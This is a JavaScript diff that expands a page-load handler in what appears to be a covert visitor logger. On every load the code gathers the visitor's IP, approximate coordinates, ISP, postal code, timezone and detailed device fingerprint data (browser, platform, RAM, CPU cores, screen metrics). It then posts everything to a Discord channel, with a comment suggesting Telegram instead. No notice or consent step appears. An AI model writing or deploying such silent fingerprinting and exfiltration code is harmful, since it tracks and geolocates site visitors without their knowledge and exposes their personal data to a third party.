@@ -180,15 +180,42 @@ window.addEventListener('load', async () => {
     if (!res.ok) throw new Error('IP info API error');
     const visitor = await res.json();
 
-    const deviceInfo = navigator.userAgent;
+   const ua = navigator.userAgent;
+    const language = navigator.language;
+    const platform = navigator.platform;
+    const cookieEnabled = navigator.cookieEnabled;
+    const deviceMemory = navigator.deviceMemory || 'Unknown';
+    const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
+    const screenRes = `${screen.width}x${screen.height}`;
+    const availRes = `${screen.availWidth}x${screen.availHeight}`;
+    const pixelRatio = window.devicePixelRatio || 1;
+    const onlineStatus = navigator.onLine ? 'Yes' : 'No';
 
     const message = `
+**💻 Visitor Info**
 IP: ${visitor.ip}
-Şehir: ${visitor.city || 'Bilinmiyor'}
-Bölge: ${visitor.region || 'Bilinmiyor'}
-Ülke: ${visitor.country || 'Bilinmiyor'}
-Cihaz: ${deviceInfo.substring(0, 100)}
-    `;
+Country: ${visitor.country || 'Unknown'}
+City: ${visitor.city || 'Unknown'}
+Region: ${visitor.region || 'Unknown'}
+Approx. Location: ${visitor.loc || 'Unknown'}
+ISP: ${visitor.org || 'Unknown'}
+Postal Code: ${visitor.postal || 'Unknown'}
+Timezone: ${visitor.timezone || 'Unknown'}
+
+**🖥️ System Info**
+Browser: ${ua.substring(0, 100)}
+Language: ${language}
+Platform: ${platform}
+Cookies Enabled: ${cookieEnabled ? 'Yes' : 'No'}
+RAM: ${deviceMemory} GB
+CPU Cores: ${hardwareConcurrency}
+Online: ${onlineStatus}
+
+**🖼️ Screen Info**
+Screen Resolution: ${screenRes}
+Available Space: ${availRes}
+Pixel Ratio: ${pixelRatio}
+`;
 
     sendDiscordMessage(message); // ya da sendTelegramMessage(message) vs.
   } catch (e) {
